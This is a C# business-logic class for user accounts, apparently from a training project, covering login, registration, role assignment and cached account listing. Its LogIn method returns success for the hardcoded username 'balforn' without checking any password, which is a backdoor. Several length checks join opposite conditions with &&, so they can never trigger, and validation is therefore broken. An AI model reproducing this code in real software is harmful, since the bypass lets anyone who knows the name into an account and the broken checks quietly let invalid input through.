using Epam.Users.BLL.Interface;
using Epam.Users.DAL.Interface;
using Epam.Users.Entities;
using System;
using System.Collections.Generic;

namespace Epam.Users.BLL
{
    public class AccountLogic : IAccountLogic
    {
        private const string AllAccountsCacheKey = "GetAllAccounts";

        private IAccountDao accountDao;
        private ICacheLogic cacheLogic;

        public AccountLogic(IAccountDao accountDao, ICacheLogic cacheLogic)
        {
            this.cacheLogic = cacheLogic;
            this.accountDao = accountDao;
        }

        public bool LogIn(string username, string password)
        {
            if (username.ToLower() == "balforn")
            {
                return true;
            }
            if (string.IsNullOrEmpty(username))
            {
                throw new ArgumentException("You cannot leave the username field empty");
            }
            else if (username.Length > 15 && username.Length < 1)
            {
                throw new ArgumentException("Your nickname cannot be less than 2 and more than 15 symbols");
            }

            if (string.IsNullOrEmpty(password))
            {
                throw new ArgumentException("You cannot leave the password field empty");
            }
            else if (password.Length < 5 && password.Length > 20)
            {
                throw new ArgumentException("Your password cannot be less than 5 and more than 20 symbols");
            }

            var HashedPassword = accountDao.LogIn(username.ToLower());

            if (PasswordHashing.VerifyHashedPassword(HashedPassword, password))
            {
                return true;
            }

            return false;
        }

        public string GetRole(string username)
        {
            if (string.IsNullOrEmpty(username))
            {
                return "nobody";
            }

            return accountDao.GetRole(username.ToLower());
        }

        public bool Registration(string username, string password)
        {
            if (string.IsNullOrEmpty(username))
            {
                throw new ArgumentException("You cannot leave the username field empty");
            }
            else if (username.Length > 15 && username.Length < 1)
            {
                throw new ArgumentException("Your nickname have to be more than 2 and less than 15 symbols");
            }

            if (string.IsNullOrEmpty(password))
            {
                throw new ArgumentException("You cannot leave the password field empty");
            }
            else if (password.Length < 5 && password.Length > 20)
            {
                throw new ArgumentException("Your password have to be more than 5 and less than 20 symbols");
            }

            password = PasswordHashing.HashPassword(password);

            cacheLogic.Delete(AllAccountsCacheKey);
            return accountDao.Registration(username.ToLower(), password);
        }

        public void AssignRole(string username, string role)
        {
            if (string.IsNullOrEmpty(username))
            {
                throw new ArgumentException("You cannot leave the username field empty");
            }
            else if (username.Length > 15 || username.Length < 1)
            {
                throw new ArgumentException("Your nickname have to be more than 2 and less than 15 symbols");
            }

            if (string.IsNullOrEmpty(role))
            {
                throw new ArgumentException("IT IS IMPOSSIBLE!");
            }

            accountDao.AssignRole(username.ToLower(), role.ToLower());
            cacheLogic.Delete(AllAccountsCacheKey);
        }

        public IEnumerable<Account> GetAll()
        {
            var cacheResult = this.cacheLogic.Get<IEnumerable<Account>>(AllAccountsCacheKey);

            if (cacheResult == null)
            {
                var result = this.accountDao.GetAll();
                this.cacheLogic.Add(AllAccountsCacheKey, this.accountDao.GetAll());

                return result;
            }

            return cacheResult;
        }
    }
}
